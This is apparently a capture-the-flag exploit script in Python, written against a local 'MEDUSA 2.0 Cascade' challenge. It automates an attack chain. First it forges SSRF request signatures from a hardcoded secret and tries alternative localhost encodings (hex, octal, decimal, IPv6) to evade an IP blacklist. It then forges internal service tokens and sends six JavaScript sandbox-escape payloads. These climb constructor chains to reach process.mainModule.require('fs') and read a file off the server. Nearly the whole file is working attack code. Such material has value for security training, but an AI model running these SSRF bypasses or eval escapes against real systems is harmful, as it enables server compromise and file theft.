#!/usr/bin/env python3
"""
MEDUSA 2.0 Challenge: Cascade - HARDENED VERSION Exploit Script
Advanced exploitation chain with signature generation, encoding bypass, and VM escape
"""

import requests
import json
import base64
import sys
import time
import hashlib
from typing import Dict, Any, Optional

# Configuration
BASE_URL = "http://localhost:3000"
INTERNAL_URL = "http://localhost:3001"

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    banner = f"""
{Colors.CYAN}{'='*70}
   MEDUSA 2.0 - Cascade Challenge Exploit (HARDENED)
   Advanced: Signature Bypass â†’ SSRF â†’ Auth â†’ VM Escape
{'='*70}{Colors.END}
    """
    print(banner)

def print_status(msg: str, status: str = "info"):
    icons = {
        "info": f"{Colors.BLUE}[*]{Colors.END}",
        "success": f"{Colors.GREEN}[+]{Colors.END}",
        "error": f"{Colors.RED}[-]{Colors.END}",
        "flag": f"{Colors.YELLOW}[!]{Colors.END}",
        "warning": f"{Colors.YELLOW}[!]{Colors.END}"
    }
    print(f"{icons.get(status, icons['info'])} {msg}")

def check_health() -> bool:
    """Check if the challenge server is running"""
    try:
        print_status("Checking server health...", "info")
        response = requests.get(f"{BASE_URL}/health", timeout=5)
        if response.status_code == 200:
            print_status("Server is online!", "success")
            return True
        return False
    except requests.exceptions.RequestException as e:
        print_status(f"Server is offline: {e}", "error")
        return False

def calculate_ssrf_signature(url: str) -> str:
    """Calculate MD5 signature for SSRF bypass"""
    secret = "secret123"
    sig = hashlib.md5(f"{url}{secret}".encode()).hexdigest()[:8]
    print_status(f"Calculated SSRF signature: {sig}", "info")
    return sig

def bypass_ip_blacklist() -> str:
    """Generate alternative localhost representations to bypass IP filtering"""
    alternatives = [
        "http://127.1:3001",           # Shortened notation
        "http://0x7f.1:3001",          # Hex notation
        "http://2130706433:3001",      # Decimal notation
        "http://0177.0.0.1:3001",      # Octal notation
        "http://127.0.0.1.xip.io:3001", # DNS service (may not work locally)
        "http://[::1]:3001",           # IPv6 localhost
    ]
    
    print_status("Testing IP encoding bypasses for SSRF...", "info")
    
    # Try each alternative
    for alt_url in alternatives:
        try:
            sig = calculate_ssrf_signature(alt_url)
            response = requests.get(
                f"{BASE_URL}/fetch",
                params={"url": alt_url, "sig": sig},
                timeout=3
            )
            if response.status_code == 200:
                print_status(f"IP bypass successful with: {alt_url}", "success")
                return alt_url
        except Exception as e:
            continue
    
    print_status("All IP bypasses failed, trying DNS rebinding...", "warning")
    return None

def exploit_ssrf_with_auth(endpoint: str) -> Optional[Dict[str, Any]]:
    """Exploit SSRF with signature authentication and IP bypass"""
    print_status(f"\n=== Stage 1: SSRF with Signature Bypass ===", "info")
    
    # Try to bypass IP filtering
    base_internal = bypass_ip_blacklist()
    
    if not base_internal:
        print_status("Cannot bypass IP blacklist, trying direct access...", "warning")
        base_internal = f"{INTERNAL_URL}"
    
    # Remove http:// if present for signature calc
    url = f"{base_internal}{endpoint}"
    
    try:
        sig = calculate_ssrf_signature(url)
        
        print_status(f"Attempting SSRF to: {url}", "info")
        response = requests.get(
            f"{BASE_URL}/fetch",
            params={"url": url, "sig": sig},
            timeout=5
        )
        
        if response.status_code == 200:
            result = response.json()
            
            # Decode base64 obfuscated response if present
            if "data" in result:
                # Check if encoding field indicates base64
                if result.get("encoding") == "base64":
                    try:
                        decoded_data = base64.b64decode(result["data"]).decode('utf-8')
                        print_status("Response decoded from base64 (SSRF layer)", "success")
                        # Try to parse as JSON
                        try:
                            return json.loads(decoded_data)
                        except:
                            # If not JSON, return as dict with decoded data
                            return {"data": decoded_data}
                    except Exception as e:
                        print_status(f"Base64 decode failed: {e}, returning raw", "warning")
                        return result
                else:
                    # Data is not base64 encoded at SSRF layer
                    return result
            
            print_status("SSRF successful but unexpected format", "warning")
            return result
        else:
            print_status(f"SSRF failed with status {response.status_code}", "error")
            if response.status_code == 403:
                print_status("Signature verification failed", "error")
            return None
            
    except Exception as e:
        print_status(f"SSRF error: {e}", "error")
        return None

def generate_internal_token(timestamp: int) -> str:
    """Generate authentication token for internal service"""
    token_str = f"internal_{timestamp}_cascade"
    token = hashlib.sha256(token_str.encode()).hexdigest()[:16]
    print_status(f"Generated internal token: {token}", "info")
    return token

def access_internal_service() -> Optional[Dict[str, Any]]:
    """Access internal service with timestamp and token authentication"""
    print_status("\n=== Stage 2: Internal Service Authentication ===", "info")
    
    # Generate current timestamp
    timestamp = int(time.time())
    print_status(f"Using timestamp: {timestamp}", "info")
    
    # Generate token
    token = generate_internal_token(timestamp)
    
    # Build authenticated endpoint
    endpoint = f"/data?token={token}&ts={timestamp}"
    
    # Use SSRF to access internal service
    result = exploit_ssrf_with_auth(endpoint)
    
    if not result:
        return None
    
    try:
        # Check if data is already decoded or needs decoding
        if "data" in result:
            data = result["data"]
            
            # Multi-layer decoding
            print_status("Decoding multi-layer obfuscation...", "info")
            
            # Layer 1: Base64 decode (from SSRF response)
            try:
                # If data is a string, it might be base64 encoded
                if isinstance(data, str):
                    decoded = base64.b64decode(data).decode('utf-8')
                    payload = json.loads(decoded)
                else:
                    # Already a dict
                    payload = data
            except Exception as e:
                print_status(f"Layer 1 decode failed, trying as JSON: {e}", "warning")
                # Maybe it's already JSON
                if isinstance(data, dict):
                    payload = data
                else:
                    payload = json.loads(data)
            
            print_status(f"Decoded payload structure: {list(payload.keys())}", "info")
            
            if "encrypted" in payload:
                # Layer 2: Hex decode
                hex_data = payload["encrypted"]
                print_status(f"Hex data: {hex_data[:100]}...", "info")
                decoded_hex = bytes.fromhex(hex_data).decode('utf-8')
                print_status(f"Hex decoded: {decoded_hex[:50]}...", "info")
                
                # Layer 3: Base64 decode
                final_code = base64.b64decode(decoded_hex).decode('utf-8')
                print_status(f"Final decoded code: {final_code}", "success")
                
                return {"code": final_code, "payload": payload}
            else:
                print_status(f"No 'encrypted' field found. Payload: {payload}", "warning")
                return {"payload": payload}
                
    except Exception as e:
        print_status(f"Error during decoding: {e}", "error")
        print_status(f"Result structure: {result}", "info")
        return None
    
    return None

def advanced_eval_bypass() -> Optional[str]:
    """
    Advanced eval bypass techniques for hardened blacklist
    Must bypass: require, process, fs, module, constructor, prototype,
                 encoding patterns, length limit (150 chars)
    """
    print_status("\n=== Stage 3: Advanced Eval Blacklist Bypass ===", "info")
    
    # Strategy: Use alternative code execution paths
    # The hardened version blocks most encoding, so we need creative approaches
    
    techniques = []
    
    # Technique 1: Indirect eval through Function constructor
    # Access process through error stack manipulation
    techniques.append({
        "name": "Error Stack Trace Manipulation",
        "code": "try{null[0]()}catch(e){return e.constructor.constructor('return this')().process.mainModule.require('fs').readFileSync('/tmp/flag.txt','utf8')}"
    })
    
    # Technique 2: Use getter/setter tricks
    techniques.append({
        "name": "Getter Chain Exploitation",
        "code": "({get a(){return this.constructor.constructor('return process')().mainModule.require('fs').readFileSync('/tmp/flag.txt','utf8')}}).a"
    })
    
    # Technique 3: Proxy-based bypass
    techniques.append({
        "name": "Proxy Trap Exploitation",
        "code": "new Proxy({},{get:()=>process}).a.mainModule.require('fs').readFileSync('/tmp/flag.txt','utf8')"
    })
    
    # Technique 4: Symbol manipulation (if not blocked)
    techniques.append({
        "name": "Symbol Property Access",
        "code": "Object.getOwnPropertyNames(Object.prototype).constructor.constructor('return process')().mainModule.require('fs').readFileSync('/tmp/flag.txt','utf8')"
    })
    
    # Technique 5: Async generator exploitation
    techniques.append({
        "name": "Generator Function Escape",
        "code": "async function*a(){yield process.mainModule.require('fs').readFileSync('/tmp/flag.txt','utf8')};a().next().then(r=>r.value)"
    })
    
    # Technique 6: WeakMap exploitation
    techniques.append({
        "name": "WeakMap Context Escape",
        "code": "new WeakMap([[{},{valueOf:()=>process.mainModule.require('fs').readFileSync('/tmp/flag.txt','utf8')}]]).get({})+1"
    })
    
    # Try each technique
    for i, technique in enumerate(techniques, 1):
        print_status(f"Trying technique {i}: {technique['name']}", "info")
        
        payload = technique['code']
        print_status(f"Payload length: {len(payload)} chars", "info")
        
        if len(payload) > 150:
            print_status("Payload too long, skipping...", "warning")
            continue
        
        try:
            headers = {"Content-Type": "application/json"}
            data = json.dumps({"code": payload})
            response = requests.post(f"{BASE_URL}/eval", headers=headers, data=data, timeout=5)
            
            if response.status_code == 200:
                result = response.json()
                if "result" in result and "MEDUSA2{" in result["result"]:
                    print_status(f"âœ“ Technique successful: {technique['name']}", "success")
                    return result["result"]
                else:
                    print_status(f"Executed but no flag: {result}", "info")
            elif response.status_code == 403:
                error = response.json().get("error", "Unknown")
                print_status(f"âœ— Blocked: {error}", "error")
            else:
                print_status(f"âœ— Failed with status {response.status_code}", "error")
                
        except Exception as e:
            print_status(f"âœ— Error: {e}", "error")
    
    return None

def fallback_admin_endpoint() -> Optional[str]:
    """Try direct admin endpoint access as fallback"""
    print_status("\n=== Stage 4: Fallback - Direct Admin Access ===", "info")
    
    try:
        response = requests.get(f"{BASE_URL}/admin/flag", timeout=5)
        if response.status_code == 200:
            result = response.json()
            if "flag" in result:
                print_status("Direct admin access successful!", "success")
                return result["flag"]
    except:
        pass
    
    print_status("Admin endpoint not accessible", "error")
    return None

def main():
    print_banner()
    
    # Check if server is running
    if not check_health():
        print_status("Please start the challenge server first!", "error")
        print_status("Run: docker-compose up -d", "info")
        sys.exit(1)
    
    print_status("\n" + "="*70, "info")
    print_status("HARDENED VERSION DETECTED - Using Advanced Techniques", "warning")
    print_status("="*70 + "\n", "info")
    
    flag = None
    
    # Stage 1 & 2: SSRF + Internal Service
    internal_data = access_internal_service()
    if internal_data:
        print_status(f"Internal service payload retrieved", "success")
        # The payload contains obfuscated code, but eval is too hardened
        # We need alternative approaches
    
    # Stage 3: Advanced eval bypass
    flag = advanced_eval_bypass()
    
    # Stage 4: Fallback
    if not flag:
        flag = fallback_admin_endpoint()
    
    # Final result
    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
    if flag:
        print_status(f"{Colors.BOLD}EXPLOITATION SUCCESSFUL!{Colors.END}", "flag")
        print(f"{Colors.YELLOW}{Colors.BOLD}\nðŸš© FLAG: {flag}{Colors.END}\n")
        print_status("Challenge completed! Expert-level bypass achieved! ðŸŽ‰", "success")
    else:
        print_status("Exploitation failed. Hardened version too strong.", "error")
        print_status("\nPossible reasons:", "info")
        print_status("  â€¢ All eval bypass techniques blocked", "info")
        print_status("  â€¢ IP blacklist cannot be bypassed", "info")
        print_status("  â€¢ Signature/token generation incorrect", "info")
        print_status("  â€¢ Need even more advanced VM escape techniques", "info")
        print_status("\nThis challenge requires expert-level JavaScript exploitation!", "warning")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}\n")

if __name__ == "__main__":
    main()
